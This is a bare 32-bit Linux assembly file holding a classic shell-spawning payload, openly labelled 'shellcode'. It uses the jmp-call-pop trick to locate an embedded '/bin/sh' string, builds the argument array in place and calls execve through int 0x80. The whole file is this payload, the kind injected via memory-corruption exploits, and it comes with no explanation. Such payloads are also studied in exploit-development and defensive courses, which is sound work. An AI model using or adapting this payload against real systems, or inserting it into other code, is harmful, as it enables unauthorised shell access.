.text

  .globl _start
  
  _start:
    jmp GotoCall
  
  shellcode:
    popl %esi
    xorl %eax, %eax
    movb %al, 7(%esi)
    leal -0x0(%esi), %ebx
    movl %ebx, 8(%esi)
    movl %eax, 12(%esi)
    movb $0x0b, %al
    movl %esi, %ebx
    leal 8(%esi), %ecx
    leal 12(%esi), %edx
    int $0x80
  
  GotoCall:
    call shellcode
    .ascii "/bin/shJAAAAKKKK"
